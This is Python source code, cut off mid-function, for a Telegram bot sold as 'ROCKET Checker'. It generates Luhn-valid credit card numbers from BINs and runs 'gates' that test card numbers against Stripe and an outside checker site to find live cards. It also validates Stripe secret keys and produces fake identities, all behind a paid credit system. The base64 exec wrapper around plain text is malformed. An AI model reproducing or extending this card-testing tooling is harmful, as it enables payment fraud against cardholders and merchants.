BINS_API_URL = 
import base64
exec(base64.b64decode("import telebot
import os
import json
import time
import string
from Tools.ping import cmd_ping
from Tools.getid import user_info
import threading
import asyncio
import sys
from Tools.bin import get_bin_info, get_bin
from Gates.strip import Tele
from cred import *
import random
from Tools.gen import gen
from Tools.sk import sk
from Tools.stats import format_server_message
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import httpx


from Tools.fake import send_fake_details, send_country_codes

bot = telebot.TeleBot(API_TOKEN)




# ✅ Restart bot function with better handling

#------------------------------------------------------------------------------------------------------------------

# ✅ Load users from JSON


# Your Flask API URL
API_URL = "https://rocketapi2.pythonanywhere.com"  # ✅ Ensure it starts with http://  # Change this to your actual Flask API URL

# ✅ Load free users from API
import requests

def load_free_users():
    try:
        response = requests.get(f"{API_URL}/get_users", headers={"Cache-Control": "no-cache"})  # ✅ Prevents caching
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching users: {e}")  # ✅ Print error if API fails
        return {}  # Return empty dict if API fails
    return {}

# ✅ Save users (Handled via API, no local file needed)
def save_free_users(data):
    requests.post(f"{API_URL}/save_users", json=data)  # Update users via API

# ✅ Deduct 1 credit from user (via API)

def edit_code_status_to_used(code):
    # Load the current codes
    codes = load_codes()
    
    if code in codes:
        # Check if the code is already marked as used
        if not codes[code].get("used", False):
            # Update the code to 'used' = True
            codes[code]["used"] = True
            
            # Save the updated codes
            save_codes(codes)
            
            print(f"✅ Code '{code}' has been marked as used.")
            return f"✅ Code '{code}' has been successfully updated to used."
        else:
            print(f"⚠️ Code '{code}' is already used.")
            return f"⚠️ Code '{code}' is already marked as used."
    else:
        print(f"⚠️ Code '{code}' not found.")
        return f"⚠️ Code '{code}' is invalid or not found."

def is_registered(user_id):
    free_users = load_free_users()  # ✅ Always reloads fresh data
    return str(user_id) in free_users

@bot.message_handler(commands=['o'])
def some_command(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    bot.reply_to(message, "✅ You are registered! Running your command...")
    
    
    
    
def op(user_id):
    response = requests.post(f"{API_URL}/deduct_credit", json={"user_id": user_id})
    
    if response.status_code == 200:
        response = response.json() # Returns the JSON response if successful
        if "True" in response:
            return True
        else:
            return False
    else:
        print(f"⚠️ API Error: {response.status_code} - {response.text}")  # Debugging
        return False

# ✅ Load codes from API
def load_codes():
    try:
        response = requests.get(f"{API_URL}/get_codes")
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException:
        return {}  # Return empty dict if API fails
    return {}

# ✅ Save codes (Handled via API)
def save_codes(codes):
    requests.post(f"{API_URL}/save_codes", json=codes)  # Update codes via API

# ✅ Generate a new redeem code (via API)
def generate_redeem_code():
    response = requests.post(f"{API_URL}/generate_code")
    return response.json() if response.status_code == 200 else None  # ✅ Returns generated code

# ✅ Add a new redeem code (via API)
def add_code(code, credits):
    requests.post(f"{API_URL}/add_code", json={"code": code, "credits": credits})
    print(f"✅ Code '{code}' added with {credits} credits.")

# ✅ Check if a code is used (via API)
def check_code_status(code):
    response = requests.get(f"{API_URL}/check_code/{code}")
    return response.json() if response.status_code == 200 else "⚠️ Code not found!"

# ✅ Mark a code as used (via API)
def use_code(code):
    response = requests.post(f"{API_URL}/use_code", json={"code": code})
    return response.json() if response.status_code == 200 else f"⚠️ Code '{code}' is invalid!"

# ✅ Generate multiple redeem codes
@bot.message_handler(commands=['code'])
def generate_code(message):
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ Usage: /code <quantity> <credits_per_code>")
        return

    try:
        quantity = int(args[1])
        credits_per_code = int(args[2])
    except ValueError:
        bot.reply_to(message, "⚠️ Enter valid numbers for quantity and credits.")
        return

    # Send request to API to generate codes
    response = requests.post(f"{API_URL}/generate_codes", json={"quantity": quantity, "credits_per_code": credits_per_code})

    if response.status_code == 200:
        result = response.json()
        if result["success"]:
            generated_codes = result["codes"]
            code_list = "\n".join([f"`{c}`" for c in generated_codes])

            bot.reply_to(message, f"📌 **Generated Codes**\n\n"
                                  f"📦 **Amount:** `{quantity}`\n"
                                  f"💰 **Credits per Code:** `{credits_per_code}`\n\n"
                                  f"🔑 **Codes:**\n\n{code_list}\n\n"
                                  f"⚡ Use `/redeem <code>` to claim credits!", parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚠️ Failed to generate codes. Please try again.")
    else:
        bot.reply_to(message, "⚠️ Something went wrong! Please try again later.")


import requests  # Ensure this is imported at the top



@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    user_id = message.chat.id
    args = message.text.split()[1:]  # Extract arguments after /redeem

    if not args:
        bot.reply_to(message, "Please provide a code: /redeem <code>")
        return

    code = args[0]

    url = "https://rocketapi2.pythonanywhere.com/redeem"
    payload = {"user_id": user_id, "code": code}
    headers = {"Content-Type": "application/json"}

    response = requests.post(url, json=payload, headers=headers)
    

    if response.status_code == 200:
        data = response.json()
        if data.get("success"):
            bot.reply_to(message, f"✅ {data['message']}\n💰 New Balance: {data['new_credits']} credits")
        else:
            bot.reply_to(message, f"⚠️ Error: {data.get('error', 'Unknown error')}")
    else:
        error = response.json()["error"]
        bot.reply_to(message, f"❌{error}")


# ✅ Check all codes with their usage status
@bot.message_handler(commands=['codes'])
def check_all_codes(message):
    codes = load_codes()
    if not codes:
        bot.reply_to(message, "⚠️ No codes available.")
        return

    code_list = "\n".join([f"`{code}` - {'✅ Used' if data['used'] else '❌ Not Used'}" for code, data in codes.items()])
    bot.reply_to(message, f"📜 **Codes List**\n\n{code_list}", parse_mode="Markdown")






from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id  # Get the user's ID
    markup = InlineKeyboardMarkup()
    markup.row_width = 2  
    markup.add(
        InlineKeyboardButton("🛠 Tools", callback_data=f"tools|{user_id}"),
        InlineKeyboardButton("🔑 Gate", callback_data=f"gate|{user_id}"),
        InlineKeyboardButton("🌟 Admin", callback_data=f"admin|{user_id}"),
        InlineKeyboardButton("❌ Close", callback_data=f"close|{user_id}"),
    )
    

    bot.send_message(
        message.chat.id,
        """🌟 Welcome back to <b>ROCKET Checker</b> 🚀  

🔹 Use the buttons below to navigate through the bot.  
🔹 Access various tools, payment checkers, and admin controls.  

📌 Want to buy this bot? DM with your price @CHATWITHROCKET_BOT  
🔐 Admins can access additional features from the Admin panel.""",
        parse_mode="HTML",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    data = call.data.split("|")  # Split callback_data to get action and user ID
    action = data[0]
    owner_id = int(data[1])  # Convert stored user ID to integer

    # Ensure only the original sender can interact with the message
    if call.from_user.id != owner_id:
        bot.answer_callback_query(call.id, "🚫 This is not your message!", show_alert=True)
        return  

    if action == "close":
        bot.delete_message(call.message.chat.id, call.message.message_id)  # Only owner can delete
        return  # Stop further execution

    elif action == "tools":
        tools_markup = InlineKeyboardMarkup()
        tools_markup.row_width = 2
        tools_markup.add(
            InlineKeyboardButton("⬅ Back", callback_data=f"back|{owner_id}"),
            InlineKeyboardButton("❌ Close", callback_data=f"close|{owner_id}"),
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="""🔧 Useful Tools

/bin bin_number - 🏦 Get BIN information  
/gen bin - 🔄 Generate credit cards  
/info - ℹ️ Get user information  
/fake - 🃏 Generate fake user details  
/countrycode - 🌍 Get country codes  
/sk sk_live_xxx - 🔍 Validate a Stripe Secret Key""",
            parse_mode="HTML",
            reply_markup=tools_markup,
        )

    elif action == "gate":
        gate_markup = InlineKeyboardMarkup()
        gate_markup.row_width = 2
        gate_markup.add(
            InlineKeyboardButton("⬅ Back", callback_data=f"back|{owner_id}"),
            InlineKeyboardButton("❌ Close", callback_data=f"close|{owner_id}"),
        )
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="💳 Payment Checkers (Gates)\n\n"
                 "/gate - 🔑 List all available gates\n"
                 "/chk <code>cc|mm|yy|cvv</code> - ✅ Check Stripe card validity\n"
                 "/b - 🔐 Braintree (Premium)\n"
                 "/pp : paypay $1 charge\n\n"
                 "Send a .txt file for multiple checks",
            parse_mode="HTML",
            reply_markup=gate_markup,
        )

    elif action == "admin":
        if str(call.from_user.id) in admin:  # Ensure admin is a list of integers
            admin_markup = InlineKeyboardMarkup()
            admin_markup.row_width = 2
            admin_markup.add(
                InlineKeyboardButton("⬅ Back", callback_data=f"back|{owner_id}"),
                InlineKeyboardButton("❌ Close", callback_data=f"close|{owner_id}"),
            )
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="""<b>🔑 Admin Commands</b>

📡 <b>System & Network</b>
➖ /ping - 📶 Check bot's network latency
➖ /stats - 📊 Get machine/server details
➖ /db - 🗄️ View database statistics
➖ /broadcast <i>message</i> - 📩 Send a message to all users
➖ /code <i>qty credits</i> - 🔑 Generate redeemable codes
➖ /codes - 📜 View all generated codes
➖ /redeem <i>code</i> - 🎁 Redeem a code
➖ /add <i>user_id credits</i> - ➕ Add credits to a user

<b>⚙️ Stay in control of your bot!</b>""",
                parse_mode="HTML",
                reply_markup=admin_markup,
            )
        else:
            bot.answer_callback_query(call.id, "🚫 You are not an admin!", show_alert=True)

    elif action == "back":
        main_menu_markup = InlineKeyboardMarkup()
        main_menu_markup.row_width = 2
        main_menu_markup.add(
            InlineKeyboardButton("🛠 Tools", callback_data=f"tools|{owner_id}"),
            InlineKeyboardButton("🔑 Gate", callback_data=f"gate|{owner_id}"),
            InlineKeyboardButton("🌟 Admin", callback_data=f"admin|{owner_id}"),
            InlineKeyboardButton("❌ Close", callback_data=f"close|{user_id}"),
        )
        
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="""🌟 Welcome back to <b>ROCKET Checker</b> 🚀  

🔹 Use the buttons below to navigate through the bot.  
🔹 Access various tools, payment checkers, and admin controls.  

📌 Want to buy this bot? DM with your price @CHATWITHROCKET_BOT  
🔐 Admins can access additional features from the Admin panel.""",
            parse_mode="HTML",
            reply_markup=main_menu_markup,
        )


@bot.message_handler(func=lambda message: message.reply_to_message and message.text.lower() == "info")
def get_replied_user_info(message):
    replied_user = message.reply_to_message.from_user  # Get the original sender's info

    user_id = replied_user.id
    username = replied_user.username or "No username"
    first_name = replied_user.first_name

    # Format the response
    response = (
        f"👤 **User Info:**\n"
        f"🆔 **ID:** `{user_id}`\n"
        f"📛 **Name:** {first_name}\n"
        f"🔗 **Username:** @{username}" if username != "No username" else "No username"
    )

    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=['countrycode'])
def ksjdkj(message):
    send_country_codes(message,bot)


@bot.message_handler(commands=['fake'])
def sjjsjs(message):
    send_fake_details(message,bot)
   

@bot.message_handler(commands=['db'])
def bot_statistics(message):
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
    free_users = load_free_users()
    codes = load_codes()
    
    total_codes = len(codes)
    redeemed_codes = sum(1 for c in codes.values() if c["used"])
    unredeemed_codes = total_codes - redeemed_codes
    total_users = len(free_users)
    total_credits = sum(user.get("credits", 0) for user in free_users.values())
    redeemed_codes = sum(1 for c in codes.values() if c.get("used", False))

    resp= f"""
📊 Bot Statistics

🔹 Total Codes Created: {total_codes}
✅ Redeemed Codes: {redeemed_codes}
❌ Unredeemed Codes: {unredeemed_codes}

👥 Total Users: {total_users}
💰 Total Credits in System: {total_credits}

⚙️ Stay updated with bot performance!
"""
    bot.reply_to(message, resp, parse_mode="Markdown")

# ✅ Redeem a code






@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    text = message.text.replace("/broadcast", "").strip()
    if not text:
        bot.reply_to(message, "⚠️ Please provide a message to broadcast.")
        return

    users = load_free_users()
    sent, failed = 0, 0

    for user_id in users.keys():
        try:
            bot.send_message(user_id, f"📢 **{text}", parse_mode="Markdown")
            sent += 1
        except Exception:
            failed += 1  # User might have blocked the bot

    bot.reply_to(message, f"✅ **Broadcast Sent!**\n\n📩 Sent: `{sent}` users\n❌ Failed: `{failed}` users", parse_mode="Markdown")




@bot.message_handler(commands=['sk'])
def owjj(message):
    chat_id = message.from_user.id
    try:
        args = message.text.split(" ", 1)
        if len(args) < 2 or not args[1].startswith("sk_live_"):
            bot.reply_to(message, "❌ **Usage:** `/start sk_live_xxx`\nPlease provide a valid Stripe Secret Key.", parse_mode="Markdown")
            return

        sk_key = args[1].strip()
        if op(message.from_user.id) ==False:
            bot.reply_to(message,"You dont have enough credit")
        else:
            
            a = sk(sk_key)
            bot.reply_to(message,a,parse_mode= "HTML")
    except:
        pass
    

@bot.message_handler(commands=['gate','gates'])
def gates(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    if str(message.from_user.id) in str(free_users):
        bot.reply_to(message,f"""💳 Payment Checkers (Gates)

/gate - 🔑 List all available gates

/chk <cc|mm|yy|cvv> - ✅ Check Stripe card validity

/b - 🔐 Braintree (Premium)""")
        

@bot.message_handler(commands=['tools','tool'])
def gates(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    chat_id = message.from_user.id
    resp = """🔧 Useful Tools

/bin bin_number : - 🏦 Get BIN information

/gen bin :- 🔄 Generate credit cards from BIN

/info - ℹ️ Get user information by replying with "info"

/fake - 🃏 Generate fake user details

/countrycode - 🌍 Get country codes

/sk sk_live_xxx - 🔍 Validate a Stripe Secret Key
    """
    bot.reply_to(message,resp,parse_mode="HTML")
    


# Function to load statistics from file
def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_codes": 0, "redeemed_codes": 0, "users": [], "credits": 0}
    
    with open(STATS_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {"total_codes": 0, "redeemed_codes": 0, "users": [], "credits": 0}

# Function to save statistics to file
def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f, indent=4)
    
    

@bot.message_handler(commands=['stats'])
def sjjsjs(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
    data =format_server_message()
    bot.reply_to(message,data,parse_mode="HTML")
    
    

    
    
@bot.message_handler(commands=['add'])
def add_credit(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    admin_id = message.from_user.id
    if str(admin_id) not in admin:  # Replace ADMIN_IDS with a list of admin Telegram IDs
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "⚠️ Usage: /addcredit <user_id> <amount>")
            return

        user_id = int(command_parts[1])
        amount = int(command_parts[2])

        # Load user data
        with open("free_users.json", "r") as file:
            users = json.load(file)

        # Update user's balance
        if str(user_id) in users:
            users[str(user_id)]['points'] += amount
        else:
            users[str(user_id)] = {'points': amount}

        # Save updated data
        with open("free_users.json", "w") as file:
            json.dump(users, file, indent=4)

        bot.reply_to(message, f"✅ Successfully added {amount} points to user {user_id}.")
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid input. Make sure to enter numbers only.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")





@bot.message_handler(commands=['register'])
def register(message):
    chat_id = str(message.from_user.id)
    api_url = "https://rocketapi2.pythonanywhere.com/register"
    
    try:
        response = requests.post(api_url, json={"user_id": chat_id})
        if response.status_code == 200 or response.status_code == 201:
            data = response.json()
            bot.reply_to(message, f"✅ {data['message']}\n\n💰 Credits: {data['credits']}")
        else:
            bot.reply_to(message, "⚠️ Something went wrong! Please try again later.")

    except Exception as e:
        bot.reply_to(message, "⚠️ Server error! Please try again later.")
        print(f"Error in /register: {e}")

@bot.message_handler(commands=['credit', 'credits'])
def credit(message):
    free_users = load_free_users()  # Load user data
    user_id = str(message.from_user.id)  # Convert to string for JSON keys

    if user_id not in free_users:
        bot.reply_to(message, "Hey, you are not registered. Please register using /register ✅")
        return

    credits = free_users[user_id]["credits"]
    bot.reply_to(message, f"💰 You have {credits} credits ✅")
    

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
        return 
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "❌ You are not an admin!")
        return
    bot.reply_to(message, f"""🔑 Admin Commands (Admins Only)

/admin - 🛠️ Access admin features
/broadcast <message> - 📢 Send a message to all users
/code <qty> <credits> - 🎟️ Generate redeemable codes
/db - 📊 View bot database statistics
📊 Server & Network Tools
/stats - 📈 Server monitoring stats
/ping - 📡 Check network latency""")



async def get_bin_details(bin_number):
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.get(f"{BINS_API_URL}{bin_number}")
            resp.raise_for_status()
            json_data = resp.json()
            brand = json_data.get("brand", "N/A")
            type_ = json_data.get("type", "N/A")
            level = json_data.get("level", "N/A")
            bank = json_data.get("bank", "N/A")
            country = json_data.get("country_name", "N/A")
            flag = json_data.get("country_flag", "N/A")
            currency = json_data.get("currency", "N/A")
            return brand, type_, level, bank, country, flag, currency
    except httpx.HTTPError as e:
        print(f"HTTP Exception: {e}")
        return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
    except Exception as e:
        print(f"Exception in get_bin_details: {e}")
        return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"

async def luhn_card_genarator(bin_input, month=None, year=None, cvv=None, amount=10):
    generated_cards = set()
    bin_template = bin_input.replace('x', '#')

    if '#' not in bin_template:
        bin_template += '#' * (16 - len(bin_template))

    if bin_template.startswith('4'):
        card_type = 'VISA'
    elif bin_template.startswith(('51', '52', '53', '54', '55')):
        card_type = 'MASTERCARD'
    elif bin_template.startswith(('34', '37')):
        card_type = 'AMEX'
    elif bin_template.startswith('6'):
        card_type = 'DISCOVER'
    else:
        card_type = 'UNKNOWN'

    while len(generated_cards) < amount:
        card_number = list(bin_template)

        for i in range(len(card_number)):
            if card_number[i] == '#':
                card_number[i] = str(random.randint(0, 9))

        card_number = ''.join(card_number)

        luhn_sum = 0
        reverse_digits = list(map(int, card_number[:-1]))[::-1]

        for i, digit in enumerate(reverse_digits):
            if i % 2 == 0:
                digit *= 2
                if digit > 9:
                    digit -= 9
            luhn_sum += digit

        check_digit = (10 - (luhn_sum % 10)) % 10
        full_card_number = card_number[:-1] + str(check_digit)

        if full_card_number not in generated_cards:
            generated_cards.add(full_card_number)

    generated_results = []
    for card in generated_cards:
        exp_month = month if month else str(random.randint(1, 12)).zfill(2)
        exp_year = year if year else str(random.randint(24, 30))
        cvv_code = (
            cvv if cvv
            else str(random.randint(100, 999)).zfill(3) if card_type != 'AMEX'
            else str(random.randint(1000, 9999)).zfill(4)
        )
        generated_results.append(f"{card}|{exp_month}|{exp_year}|{cvv_code}")

    return '\n'.join(generated_results)

async def generate_code_blocks(all_cards):
    code_blocks = ""
    cards = all_cards.split('\n')
    for card in cards:
        code_blocks += f"<code>{card}</code>\n"
    return code_blocks

async def gen_cc(cc_bin, month=None, year=None, cvv=None, amount=10):
    return await luhn_card_genarator(cc_bin, month, year, cvv, amount)

def bcall_gen(client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(gen_cmd(client, message))
    loop.close()

async def gen_cmd(client, message):
    user_id = str(message.from_user.id)
    
    try:
        ccsdata = message.text.split()[1]
        cc_parts = ccsdata.split("|")
        cc = cc_parts[0]
        cc = cc.replace('\u200e', '')
        mes = cc_parts[1] if len(cc_parts) > 1 else None
        ano = cc_parts[2] if len(cc_parts) > 2 else None
        cvv = cc_parts[3] if len(cc_parts) > 3 else None
    except IndexError:
        bot.reply_to(message, "❌ Invalid Format! Use:\n`/gen 447697|12|25|123`", parse_mode="Markdown")
        return
    amount = 10
    try:
        amount = int(message.text.split()[2])
    except (IndexError, ValueError):
        pass
    delete_msg = bot.reply_to(message, "<b>Generating...</b>", parse_mode="HTML")
    start = time.perf_counter()
    getbin = await get_bin_details(cc[:6])
    brand, type_, level, bank, country, flag, currency = getbin
    if amount > 10000:
        bot.reply_to(message, "<b>⚠️ Maximum Allowed: 10K</b>", parse_mode="HTML")
        return
    all_cards = await luhn_card_genarator(cc, mes, ano, cvv, amount)
    if not os.path.exists("downloads"):
        os.makedirs("downloads")
    filename = f"downloads/{amount}x_CC_Generated_By_{user_id}.txt"
    if amount == 10:
        response_text = (
            f"- ✅ 𝐂𝐂 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n"
            f"- 🔢 𝐁𝐢𝐧: <code>{cc}</code>\n"
            f"- 🔢 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}\n\n"
            f"{await generate_code_blocks(all_cards)}\n"
            f"- ℹ️ {brand} - {type_} - {level}\n"
            f"- 🏛 𝐁𝐚𝐧𝐤: {bank}\n"
            f"- 🇺🇸 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n\n"
            f"- ⏳ 𝐓𝐢𝐦𝐞: {time.perf_counter() - start:.2f}s\n"
            f"- 👤 Checked by <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
        )
        bot.delete_message(message.chat.id, delete_msg.message_id)
        bot.reply_to(message, response_text, parse_mode="HTML")
        time.sleep(0.1)
    else:
        with open(filename, "w") as f:
            f.write(all_cards)
        caption = f"""
- 🔢 𝐁𝐢𝐧: <code>{cc}</code>
- 🔢 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}

- ℹ️ {brand} - {type_} - {level}
- 🏛 𝐁𝐚𝐧𝐤: {bank}
- 🇺🇸 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag} {currency}

- ⏳ 𝐓𝐢𝐦𝐞: {time.perf_counter() - start:.2f}s
- 👤 Checked by <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> ⤿ Premium ⤾
"""
        bot.delete_message(message.chat.id, delete_msg.message_id)
        with open(filename, "rb") as doc_file:
            bot.send_document(
                message.chat.id,
                doc_file,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )
        try:
            os.remove(filename)
        except FileNotFoundError:
            pass
        time.sleep(0.1)
        
free_users = load_free_users()
@bot.message_handler(commands=['gen'])     
def gen_command_handler(message):
    user_id = str(message.from_user.id)
    
    bcall_gen(None, message)




free_users = load_free_users()
@bot.message_handler(commands=['ping'])
def o(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
        return 
    if str(message.from_user.id) not in admin:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
    cmd_ping(bot, message)
@bot.message_handler(commands=['info'])
def so(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    user_info(bot, message)
@bot.message_handler(commands=['bin'])
def ssksjsjo(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    a = get_bin_info(bot, message)
    print(a)
    
@bot.message_handler(commands=['pp'])
def skjsj(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    a = bot.reply_to(message,"<b>⏳ Processing your request... Please wait.</b>",parse_mode="HTML")
    chat = message.from_user.id
    
    cc = message.text.split()[1:]
    if len(cc) != 1:
        resp = """❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂 𝐝𝐞𝐭𝐚𝐢𝐥𝐬 𝐚𝐟𝐭𝐞𝐫 the command. Use: <code>/chk cc|mm|yy|cvv</code>"""
        bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=a.message_id,
                text=resp,
                parse_mode="HTML"
            )
    else:
        if op(message.from_user.id) ==False:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=a.message_id,
                text="You dont have enough credit",
                parse_mode="HTML"
            )
        else:
            start_time = time.perf_counter()
            cc = message.text.split()
            cc = cc[1]
            ca = None
            
            
            
            
            data = get_bin(cc)
            if data is None:
                data = {}
            bank = data["bank"]
            country = data.get("country", "N/A")
            scheme = data.get("scheme", "N/A")
            type_ = data.get("type", "N/A")
            level = data.get("level", "N/A")
            bin_number = cc[:6]
            if bin_number[0] == 4:
                ca = "Visa"
            if bin_number[0] == 5:
                ca = "MasterCard"
            else:
                pass
            
                        
            
            url = f"https://wifiotp.xyz/chk.php?lista={cc}"
    
            response = requests.get(url)
            last = response.text
            end_time = time.perf_counter()
            
            execution_time = end_time - start_time
            
            if "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱" in last:
                last = "❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱"
            resp = f""" 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
┏━━━━━━━━━━━⍟
┃𝐂𝐂 <code>{cc}</code>┗━━━━━━━⊛
𝐆𝐚𝐭𝐞𝐰𝐚𝐲:  <b>STRIPE AUTH</b> 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:  {last} 
        
𝐈𝐧𝐟𝐨: {bin_number} {ca}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
𝐁𝐚𝐧𝐤: {bank}
        
𝐓𝐢𝐦𝐞: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
<b>Req by :</b> @{message.from_user.username}"""
            bot.edit_message_text(chat_id=message.chat.id,message_id=a.message_id,text=resp,parse_mode="HTML")
    

@bot.message_handler(commands=['chk'])
def bhufgh(message):
    if not is_registered(message.from_user.id):
        bot.reply_to(message, "Hey, you are not registered. Please register using /register cmd.✅")
        return
    a = bot.reply_to(message,"<b>⏳ Processing your request... Please wait.</b>",parse_mode="HTML")
    char_id = message.from_user.id
    cc = message.text.split()[1:]
    if len(cc) != 1:
        resp = """❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂 𝐝𝐞𝐭𝐚𝐢𝐥𝐬 𝐚𝐟𝐭𝐞𝐫 the command. Use: <code>/chk cc|mm|yy|cvv</code>"""
        bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=a.message_id,
                text=resp,
                parse_mode="HTML"
            )
    else:
        if op(message.from_user.id) ==False:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=a.message_id,
                text="You dont have enough credit",
                parse_mode="HTML"
            )
        else:
            cc = message.text.split()
            cc = cc[1]
            ca = None
            start_time = time.perf_counter()
            last = Tele(cc)
            last = str(last)
            
            data = get_bin(cc)
            if data is None:
                data = {}
            bank = data["bank"]
            country = data.get("country", "N/A")
            scheme = data.get("scheme", "N/A")
            type_ = data.get("type", "N/A")
            level = data.get("level", "N/A")
            bin_number = cc[:6]
            if bin_number[0] == 4:
                ca = "Visa"
            if bin_number[0] == 5:
                ca = "MasterCard"
            else:
                pass
            end_time = time.perf_counter()
            
            execution_time = end_time - start_time
            
                        
            if 'Your card was declined.' in last:
                last = 'Your card was declined.'
            if 'success' in last:
                last = 'APPROVED ✅'
            if 'Card Expired' in last:
                last = 'Your Card Expired'
            if 'Live' in last:
                last = 'APPROVED ✅'
            if 'Unable to authenticate' in last:
                last = 'Declined - Call Issuer'
                    
            if "Unable to authenticate" in last or "Card Expired" or "Your card was declined.":
                resp = f""" 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
┏━━━━━━━━━━━⍟
┃𝐂𝐂 <code>{cc}</code>┗━━━━━━━⊛
𝐆𝐚𝐭𝐞𝐰𝐚𝐲:  <b>STRIPE AUTH</b> 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:  {last} 
        
𝐈𝐧𝐟𝐨: {bin_number} {ca}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
𝐁𝐚𝐧𝐤: {bank}
        
𝐓𝐢𝐦𝐞: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
<b>Req by :</b> @{message.from_user.username}"""
                            #bot.send_message(chat_id,f"Card : <code>{cc}</code>\nStatus : Decline❌\nTime taken : {execution_time:.2f}s",parse_mode="HTML")
                bot.edit_message_text(chat_id=message.chat.id,message_id=a.message_id,text=resp,parse_mode="HTML")
                    
            elif 'succeeded' in last or 'Live' in last:
                resp = f""" 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
┏━━━━━━━━━━━⍟
┃𝐂𝐂 <code>{cc}</code>┗━━━━━━━⊛
𝐆𝐚𝐭𝐞𝐰𝐚𝐲:  <b>STRIPE AUTH</b> 
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞:  APPROVED ✅ 
        
𝐈𝐧𝐟𝐨: {bin_number} {ca}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
𝐁𝐚𝐧𝐤: {bank}
        
𝐓𝐢𝐦𝐞: {execution_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
